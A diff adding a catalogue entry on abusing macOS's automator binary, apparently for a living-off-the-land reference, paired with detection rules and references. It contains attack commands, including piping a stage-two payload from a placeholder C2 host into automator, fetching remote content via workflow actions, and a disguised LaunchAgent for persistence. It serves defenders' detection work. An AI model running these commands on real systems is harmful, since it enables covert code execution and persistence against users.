@@ -1,0 +1,121 @@
+name: automator
+author: Hare Sudhan (@cyb3rbuff)
+short_description: Run an Automator .workflow bundle, including its Run Shell Script, Run AppleScript, and Run JavaScript actions, from the command line.
+full_description: >-
+  automator runs an Automator .workflow bundle, executing the chain of actions stored inside it and optionally setting
+  the workflow's input and its variables for that run. The action set shipped in /System/Library/Automator includes
+  Run Shell Script, Run AppleScript, and Run JavaScript, so a workflow bundle is a script container whose payload lives
+  in the bundle's document.wflow XML rather than on the command line. For an attacker that is proxy execution behind a
+  signed Apple binary: the command line is only a path to a document, and the script runs inside the Automator runtime
+  rather than under the invoking shell. MITRE ATT&CK names Automator workflows as an execution path for AppleScript
+  alongside osascript, and Elastic ships a rule for Automator execution followed by a network connection from its XPC
+  runner.
+created: 2026-09-20
+example_use_cases:
+  - name: Proxy execution of a shell payload held in a workflow bundle
+    description: >-
+      A .workflow bundle containing a Run Shell Script action runs its commands when the bundle is passed to automator.
+      The commands live in the bundle's document.wflow, so nothing but a document path appears on the command line, and
+      the shell is started by the Automator runtime rather than by the caller. No elevated privileges are needed; the
+      payload runs with the privileges of the invoking user.
+    code: automator /Users/Shared/.cache/update.workflow
+    tactics:
+      - Execution
+      - Defense Evasion
+    tags: []
+  - name: Pass the payload in over standard input instead of writing it to the workflow
+    description: >-
+      The -i flag sets the workflow's input, and an argument of "-" makes automator read that input from standard input,
+      treating each newline-terminated line as one text input item. A Run Shell Script action whose "Pass input" setting
+      is stdin hands that data to the chosen shell. The bundle staged on disk can therefore be a generic harness with no
+      indicators of its own, while the attacker-controlled content arrives at run time and is never written to a file.
+    code: curl -s https://<C2_HOST>/stage2 | automator -i - /Users/Shared/.cache/harness.workflow
+    tactics:
+      - Execution
+      - Defense Evasion
+    tags: []
+  - name: Supply attacker-controlled values at run time with workflow variables
+    description: >-
+      The -D flag sets a named Automator variable for a single run of the workflow. Variables can be dragged onto the
+      fields of an action, so a workflow built that way holds no host names, URLs, or paths of its own and the
+      indicators move out of the staged bundle and into the invoking command. The variables must already be bound into
+      the actions' fields for the supplied values to have any effect.
+    code: automator -D C2_HOST=<C2_HOST> -D STAGE_PATH=/Users/Shared/.cache/stage2 /Users/Shared/.cache/sync.workflow
+    tactics:
+      - Execution
+      - Defense Evasion
+    tags: []
+  - name: Retrieve remote content through Automator's own network actions
+    description: >-
+      Automator ships network actions such as Download URLs and Get Contents of Webpages in /System/Library/Automator.
+      A workflow built from those actions performs the fetch inside the Automator runtime, so the outbound connection is
+      attributed to Automator and its com.apple.automator.runner XPC service rather than to curl, nscurl, or a scripting
+      interpreter. The URL can be handed in as the workflow input with -i, keeping it out of the bundle. This is the
+      shape Elastic's "Suspicious Automator Workflows Execution" rule looks for: an Automator process start followed
+      within fifteen seconds by a network connection.
+    code: automator -i https://<C2_HOST>/stage2 /Users/Shared/.cache/fetch.workflow
+    tactics:
+      - Command and Control
+    tags: []
+  - name: Create a LaunchAgent that invokes a workflow bundle
+    description: >-
+      A user LaunchAgent that names /usr/bin/automator as its program keeps the payload out of the property list: the
+      plist references a document, and the executable it invokes is an Apple binary, so reading the agent does not
+      reveal the commands. This needs only write access to ~/Library/LaunchAgents and runs at each login as the
+      logged-in user; a plist under /Library/LaunchDaemons would require root. The agent must then be loaded to run.
+    code: |-
+      cat > ~/Library/LaunchAgents/com.apple.automator.sync.plist <<'EOF'
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+      <plist version="1.0">
+      <dict>
+        <key>Label</key><string>com.apple.automator.sync</string>
+        <key>ProgramArguments</key>
+        <array>
+          <string>/usr/bin/automator</string>
+          <string>/Users/Shared/.cache/update.workflow</string>
+        </array>
+        <key>RunAtLoad</key><true/>
+      </dict>
+      </plist>
+      EOF
+    tactics:
+      - Persistence
+      - Execution
+      - Defense Evasion
+    tags: []
+  - name: Load a workflow-backed LaunchAgent
+    description: Loading the LaunchAgent activates its RunAtLoad behavior so launchd invokes automator with the workflow bundle. The agent must already exist at the specified path; a user agent requires no root privileges.
+    code: launchctl load ~/Library/LaunchAgents/com.apple.automator.sync.plist
+    tactics:
+      - Persistence
+      - Execution
+      - Defense Evasion
+    tags: []
+paths:
+  - /usr/bin/automator
+  - /System/Applications/Automator.app/Contents/MacOS/Automator
+detections:
+  - name: "Elastic: Suspicious Automator Workflows Execution - an Automator process start followed within 15 seconds by a network connection from its XPC service"
+    url: https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/macos/execution_script_via_automator_workflows
+  - name: "Elastic detection-rules: execution_script_via_automator_workflows.toml (EQL source for the rule above)"
+    url: https://github.com/elastic/detection-rules/blob/main/rules/macos/execution_script_via_automator_workflows.toml
+  - name: "Process Lineage Detection: automator, Automator, or com.apple.automator.runner spawning sh, bash, zsh, python, perl, or osascript children"
+    url: N/A
+  - name: "File Creation Detection: a .workflow bundle, or a document.wflow inside one, written outside ~/Library/Services, ~/Library/Workflows, or an installer payload - especially under /tmp, /Users/Shared, or a hidden directory"
+    url: N/A
+  - name: "Command Line Argument Detection: automator invoked with -i - (workflow input read from standard input) or with -D variable assignments"
+    url: N/A
+  - name: "Persistence Detection: a LaunchAgent or LaunchDaemon whose ProgramArguments name /usr/bin/automator"
+    url: N/A
+resources:
+  - name: "automator(1) man page"
+    url: https://keith.github.io/xcode-man-pages/automator.1.html
+  - name: "Apple Developer: Creating Shell Script Actions - how a shell script action receives input via stdin or as arguments"
+    url: https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Articles/ShellScriptActions.html
+  - name: "Apple Support: Use variables in Automator on Mac"
+    url: https://support.apple.com/guide/automator/use-variables-atmtr15198/mac
+  - name: "MITRE ATT&CK T1059.002 - Command and Scripting Interpreter: AppleScript, which names Automator workflows as an execution path"
+    url: https://attack.mitre.org/techniques/T1059/002/
+  - name: "Red Canary: A bundle of nerves - Automator applets, the Automator Application Stub, and document.wflow"
+    url: https://redcanary.com/blog/threat-detection/mac-application-bundles/
